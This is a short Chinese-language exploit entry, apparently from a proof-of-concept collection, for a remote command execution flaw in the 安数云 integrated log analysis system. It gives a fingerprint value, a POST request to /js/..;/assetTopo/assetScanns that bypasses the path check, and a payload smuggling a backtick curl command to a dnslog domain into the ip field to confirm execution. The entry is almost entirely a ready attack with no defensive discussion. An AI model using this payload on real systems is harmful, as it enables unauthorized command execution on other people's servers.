# 安数云综合日志分析系统assetScanns存在远程命令执行漏洞

安数云综合日志分析系统 ｜ 命令执行 ｜ —
- **指纹**：`"-2008445303"`
- **请求**：`POST /js/..;/assetTopo/assetScanns HTTP/1.1`

**Payload**
```
ip=127.0.0.1`curl l1czzj.dnslog.cn`\&port=8083
```
- **响应特征**：200 Dnslog回显